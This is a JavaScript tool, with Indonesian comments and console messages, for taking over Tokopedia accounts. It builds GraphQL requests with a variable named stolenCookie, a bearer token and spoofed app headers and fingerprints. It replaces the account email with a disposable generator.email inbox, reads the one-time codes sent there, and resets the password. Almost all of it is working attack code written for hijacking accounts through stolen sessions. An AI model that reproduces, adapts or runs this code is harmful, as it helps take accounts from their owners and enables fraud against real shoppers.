/**
 * HELPER: GQL REQUEST SENDER
 */
async function sendGql(query, variables, session, device, path, stolenCookie, auth = null) {

    const bodyPayload = JSON.stringify({ query, variables });
    const STUB_FRESH = crypto.createHash('md5').update(bodyPayload).digest('hex').toUpperCase();

   
    const KHRONOS_AUTO = Math.floor(Date.now() / 1000).toString();
    const GORGON_FRESH = '8404e0cc0000ac3dcde09c5de5766f0839c9b11865e520bf357e'; 
  
    const headers = {
        'Host': 'gql.tokopedia.com',
        'Content-Type': 'application/json; encoding=utf-8',
        'User-Agent': 'Tokopedia/2.368.0 (com.tokopedia.Tokopedia; build:202604172026; iOS 26.2.1) Alamofire/1.0.0',
        'Accept': 'application/json',
        'Tkpd-SessionId': session,
        'X-Tkpd-Path': path,
        'Fingerprint-Data': device.fpData,
        'Fingerprint-Hash': device.fpHash,
        'X-Gorgon': GORGON_FRESH,  
        'X-SS-STUB': STUB_FRESH,  
        'Cookie': stolenCookie,    
        'X-Tkpd-Authorization': auth || 'TKPD Tokopedia:lD2Y7LpWc1Mnxp2BERLbmV9Efc0=',
        'Authorization': auth || 'TKPD Tokopedia:lD2Y7LpWc1Mnxp2BERLbmV9Efc0=',
        'X-Khronos': KHRONOS_AUTO,
        'bd-device-id': device.bdDeviceId,
        'Connection': 'keep-alive',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'id-ID;q=1.0, en-ID;q=0.9'
    };

    // Tambahkan Accounts-Authorization jika sedang di fase Register/Profile
    if (path.includes('register')) {
        headers['Accounts-Authorization'] = 'dzFIWXBpZFNocmU=F82A'; 
    }

    try {
        return await axios.post('https://gql.tokopedia.com/graphql', 
            { query, variables }, 
            { headers, timeout: 10000 }
        );
    } catch (err) {
        return { data: { errors: [{ message: err.message }] } };
    }
}
/**
 * 📧 POLLING INBOX (SINKRON DENGAN HTML BOX TOKPED)
 */
async function waitEmailOtp(inboxLink) {
    const startTime = Date.now();
    while (Date.now() - startTime < 180000) { 
        try {
            const res = await axios.get(inboxLink, {
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                timeout: 10000
            });
            const html = res.data;
            const regexTokped = /border: 1px solid #E5E7E9;[^>]*>(\d{6})<\/div>/;
            const match = html.match(regexTokped);
            if (match && match[1]) {
                console.log(chalk.green(`\n [✓] OTP DITEMUKAN: `) + chalk.white.bold(match[1]));
                return match[1];
            }
            const fallback = html.match(/(\d{6})/g);
            if (fallback && html.includes("Tokopedia")) return fallback[fallback.length - 1];
        } catch (e) {}
        process.stdout.write(chalk.gray(`    > Menunggu Email... ${Math.floor((180000-(Date.now()-startTime))/1000)}s \r`));
        await delay(8000);
    }
    return null;
}

/**
 * 📧 FUNGSI UPDATE EMAIL (v2.0 - Auto Domain Scraper)
 */
async function processUpdateEmail(accessToken, stolenCookie, session, device) {
    console.log(chalk.magenta(`\n [i] MEMULAI PROSES UPDATE EMAIL (LIVE DOMAIN MODE)...`));


    let attempt = 0;
    while (true) {
        attempt++;
        // Rotasi domain dari list live
        const currentDomain = `konterkulo.com`;
        const userMail = `paizu${Math.floor(Math.random() * 999999)}`;
        const fullEmail = `${userMail}@${currentDomain}`;
        const inboxLink = `https://generator.email/${fullEmail}`;

        console.log(chalk.blue(` [i] Percobaan #${attempt} | Target: ${chalk.white(fullEmail)}`));

        try {
            // 1. Validate
            const valRes = await sendGql(`mutation userProfileValidate($email: String) { userProfileValidate(email: $email) { isValid message } }`, 
                { email: fullEmail }, session, device, "/graphql/userProfileValidate", stolenCookie, `Bearer ${accessToken}`);

            if (!valRes?.data?.userProfileValidate?.isValid) {
                console.log(chalk.yellow(` [!] Domain ${currentDomain} DITOLAK Tokped. Skip...`));
                continue; 
            }

            // 2. Request OTP
            const otpReq = await sendGql(`query OTPRequest($otpType: String!, $mode: String, $email: String, $otpDigit: Int) { OTPRequest: OTPRequestV2(otpType: $otpType, mode: $mode, email: $email, otpDigit: $otpDigit) { success message } }`, 
                { otpType: "141", mode: "email", email: fullEmail, otpDigit: 6 }, session, device, "/graphql/OTPRequest", stolenCookie, `Bearer ${accessToken}`);
            
            if (!otpReq?.data?.OTPRequest?.success) {
                console.log(chalk.yellow(` [!] Gagal Request OTP ke ${currentDomain}. Re-rolling...`));
                continue;
            }

            console.log(chalk.blue(` [i] OTP Terkirim! Menunggu 3 Menit di ${currentDomain}...`));

            // 3. Polling OTP
            const emailOtp = await waitEmailOtp(inboxLink);
            if (!emailOtp) {
                console.log(chalk.red(` [!] TIMEOUT di ${currentDomain}. Ganti domain...`));
                continue; 
            }

            // 4. Validate OTP
            const valOtpRes = await sendGql(`query OTPValidate($email: String, $code: String!, $otpType: String, $mode: String) { OTPValidate: OTPValidateV2(code: $code, otpType: $otpType, email: $email, mode: $mode) { validateToken } }`, 
                { email: fullEmail, code: emailOtp, otpType: "141", mode: "email" }, session, device, "/graphql/OTPValidate", stolenCookie, `Bearer ${accessToken}`);
            
            const emailVToken = valOtpRes?.data?.OTPValidate?.validateToken;

            // 5. Submit Update
            const finalUpdate = await sendGql(`mutation userProfileUpdate($email: String, $currValidateToken: String) { userProfileUpdate(email: $email, currValidateToken: $currValidateToken) { isSuccess } }`, 
                { email: fullEmail, currValidateToken: emailVToken }, session, device, "/graphql/userProfileUpdate", stolenCookie, `Bearer ${accessToken}`);

            if (finalUpdate?.data?.userProfileUpdate?.isSuccess) {
                console.log(chalk.green.bold(` [✓] EMAIL MATENG: ${fullEmail}`));
                return fullEmail;
            }
        } catch (e) {
            console.log(chalk.red(` [!] Error di #${attempt}: ${e.message}`));
            await delay(3000);
        }
    }
}

/**
 * 🔑 FUNGSI SET PASSWORD (RSA SYNC)
 */
async function processSetPassword(accessToken, stolenCookie, session, device, confirmedEmail) {
    console.log(chalk.magenta(`\n [i] MEMULAI PROSES SET PASSWORD...`));
    const passEnc = "";


    try {
        await sendGql(`mutation resetPassword($input: ResetPasswordRequest!) { resetPassword(input: $input) { is_success } }`, 
            { input: { emailphone: confirmedEmail } }, session, device, "/graphql/resetPassword", stolenCookie, `Bearer ${accessToken}`);
        
        const otp = await waitEmailOtp(`https://generator.email/${confirmedEmail}`);
        if (!otp) return false;

        const valOtpRes = await sendGql(`query OTPValidate($email: String, $code: String!, $otpType: String, $mode: String) { OTPValidate: OTPValidateV2(code: $code, otpType: $otpType, email: $email, mode: $mode) { validateToken } }`, 
            { email: confirmedEmail, code: otp, otpType: "132", mode: "email" }, session, device, "/graphql/OTPValidate", stolenCookie, `Bearer ${accessToken}`);
        
        const vToken = valOtpRes.data?.OTPValidate?.validateToken;

        const final = await sendGql(`mutation submitResetPasswordV2($input: SubmitResetPasswordV2Request!) { submitResetPasswordV2(input: $input) { updated } }`, {
            input: { encode: Buffer.from(confirmedEmail).toString('base64'), new_password: passEnc, repeat_password: passEnc, validatetoken: vToken, h: "3fec" }
        }, session, device, "/graphql/submitResetPasswordV2", stolenCookie, `Bearer ${accessToken}`);

        return final.data?.submitResetPasswordV2?.updated || false;
    } catch (e) { return false; }
}
